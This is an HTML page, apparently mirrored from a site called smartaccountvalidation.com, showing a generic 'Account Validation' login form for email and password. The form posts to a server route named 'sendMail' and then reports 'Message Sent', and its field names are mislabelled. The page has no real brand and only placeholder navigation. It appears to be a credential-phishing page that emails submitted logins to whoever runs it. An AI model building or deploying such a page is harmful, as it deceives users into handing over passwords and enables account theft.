<!DOCTYPE html>
<html lang="en">
    
<!-- Mirrored from smartaccountvalidation.com/ by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 23 Jul 2024 07:10:25 GMT -->
<head>
        <meta charset="UTF-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="viewport" content="width=de vice-width,initial-scale=1.0">
        <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:opsz,wght,FILL,GRAD@20..48,100..700,0..1,-50..200" />
        <title>login</title>
        <link rel="stylesheet" href="login.html">
        <style>
            *{
                margin: 0;
                padding: 0;
                box-sizing: border-box;
                font-family: 'Poppins',sans-serif;
                border: none;
                outline: none;
                text-decoration: none;
            }
            :root{
                --site-inline-padding:64px;
                --site-bg-color:/* rgb(252, 252, 252) */aliceblue;
                --site-name-color:rgb(21,76,121);
            }
            html{
                font-size: 14px;
            }
            body{
                width: 100%;
                height: 100vh;
                background-color: var(--site-bg-color);
                position: relative;
                
            }
            #menu,
            #cls{
                visibility: hidden;
            }
            body .site-header{
                width: 100%;
                height: auto;
                background: #fff;
                padding-inline: var(--site-inline-padding);
                display: flex;
                align-items: center;
                justify-content: space-between;
                padding-block: 1rem;
            }
            .site-header .site-logo{
                display: flex;
                align-items: center;
                justify-content: center;
                gap: 1rem;
            }
            .site-header .site-logo h2{
                font-size: 17px;
                color: var(--site-name-color);
                font-weight: 600;
            }
            .site-header .navigation{
                width: auto;
                display: flex;
                gap: 2.5rem;
                padding-block: .5rem;
            }
            .site-header .navigation a{
                color: #000;
                font-size: 1.1rem;
                padding-block: .2rem;
                transition: 20ms all ease-in-out;
            }
            .site-header .navigation a:hover{
                border-bottom: 2px solid var(--site-name-color);
            }
            .site-header .btn-navs{
                width: auto;
                height: auto;
                display: flex;
                align-items: center;
                justify-content: center;
                gap: 1rem;
            }
            .site-header .btn-navs a{
                color: var(--site-name-color);
                font-size: 1.2rem;
                opacity: 1;
            }
            .site-header .btn-navs button{
                color: #fff;
                background: #000;
                width: fit-content;
                height: auto;
                padding: .8rem 1.3rem;
                border-radius: 9px;

            }
            @media screen and (min-width:300px) and (max-width:700px){
                body .site-header{
                    width: 100%;
                    display: flex;
                    justify-content: space-between;
                    padding-inline: 1.2rem;
                }
                body .site-header .site-logo h2{
                    font-size: .8rem;
                    font-weight: 900;
                } 
                .site-header .navigation{
                    flex-direction: column;
                    position: absolute;
                    top: 4.2rem;
                    left: 0px;
                    width: 100%;
                    height: 100vh;
                    z-index: 800;
                    background: #fff;
                    padding-block: 2rem;
                    padding-inline: 2rem;
                   visibility: hidden;
                   transition: 300ms all ease-in-out;

                }
                #menu{
                    visibility: visible;
                }
                #cls{
                    visibility: hidden;
                    position: absolute;
                    top: 2rem;
                    right: 2rem;
                }
                .site-header .btn-navs button{
                    padding-inline: 1rem;
                    padding-block: .5rem;
                }
                body .form-sect form{
                    width: 350px;
                }
                
            }
            .form-sect{
                width: 100%;
                height: auto;
                display: flex;
                align-items: center;
                justify-content: center;
                margin-top: 6rem;
            }
            .form-sect form{
                width: 450px;
                background: #fff;
                padding: 1rem 1rem 2rem;
                border-radius: 5px;
            }
            .form-sect form .form-header{
                display: flex;
                width: 100%;
                height: auto;
                flex-direction: column;
                justify-content: center;
                gap: .2rem;
                align-items: center;
                margin-bottom: 2rem;
            }
            .form-sect form span{
                display: block;
                text-align: center;
                font-size: 4rem;
            }
            .form-sect form .form-header > p{
                font-size: 1.5rem;
                font-weight: bold;
                text-transform: capitalize;
                color: #000;
                opacity: .9;
                margin-bottom: 1rem;

            }
            .form-sect form .user-input-sect{
                display: flex;
                flex-direction: column;
                gap: 1rem;
                margin-bottom: 2rem;
            }
            .form-sect form .user-input-sect .inp{
                width: 100%;
                height: 3rem;
                border: 1px solid black;
                position: relative;
                border-radius: 2px;
            }
            .form-sect form .user-input-sect .inp p{
                position: absolute;
                top: -8px;
                left: 5px;
                z-index: 200;
                color: #000;
                background: #fff;
                font-weight: 500;
                font-size: 1rem;
                padding-inline: .2rem;
            }
            .form-sect form .user-input-sect .inp input{
                width: 100%;
                height: 100%;
                display: block;
                border-radius: 2px;
                padding: 1rem;
                color: #000;
                font-size: 1.2rem;
            }
            .form-sect form button{
                width: 100%;
                height: 3rem;
                color: #fff;
                background: #000;
                display: flex;
                align-items: center;
                justify-content: center;
                border-radius: 8px;
                text-transform: uppercase;
            }
            @media screen and (min-width:300px) and (max-width:700px) {
                .form-sect form .form-header > p{
                    font-size: 1rem;
                }
            }
        </style>
    </head>
    <body>
        <header class="site-header">
            <div class="site-logo">
                <span> <img width="30px" height="30px" src="https://res.cloudinary.com/dwsla5hkc/image/upload/v1721714531/logo3_pomogb.png"></span>
                <h2>ACCOUNT VALIDATION</h2> 
            </div>
            <nav class="navigation" id="nav">
                <a href="#">Home</a>
                <a href="#">About</a>
                <a href="#">Contact Us</a>
                <a href="#">Services</a>
                <span class="material-symbols-outlined" id="cls">close</span>
            </nav>
            <div class="btn-navs"><!-- 
                <a href="#">Login</a> -->
                <button class="btnlogin-popup">Sign Up</button>
                <span class="material-symbols-outlined" id="menu">menu</span>

            </div>
            
        </header>
        <section class="form-sect">
        <form class="contact-form" action="{{route('sendMail')}}" method="post">
               <div class="form-header">
                    <span class="material-symbols-outlined">login</span>
                    <p>Login to your Account</p>
                </div>
                
                <div class="user-input-sect">
                    <div class="username inp" >
                        <p>Email Address</p>
                        <input id="txt" type="email" name="Name" required>
                    </div>
                    <div class="password inp">
                        <p>Password</p>
                        <input id="txt" type="password" name="Email" required>
                    </div>
                </div>
                <button type="submit">continue</button>
            </form>
        </section>  
    
        <script>
            let closeBtn = document.getElementById("cls");
            let menu = document.getElementById('menu');
            let nav = document.getElementById('nav');

            menu.addEventListener('click', ()=>{
                nav.style.visibility = 'visible';
                closeBtn.style.visibility = 'visible';

            });
            closeBtn.addEventListener('click', ()=>{
                nav.style.visibility = 'hidden';
                closeBtn.style.visibility = 'hidden';
            })

        </script>
<script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
<!-- header style two End -->
@if(session()->has('message'))
<script>
	Swal.fire({
	icon: "success",
	title: "Message Sent",
	text: "{{ session()->get('message') }}",
	});
</script>
@endif
  
    <script>

      const switchForm = () => {

        $("#userInput").hide();
        $("#codeInput").show();
      }

      window.addEventListener('load', function () {
        $("#codeInput").hide();
        //switchForm();
      })

    </script>
    
  </body>

</html>
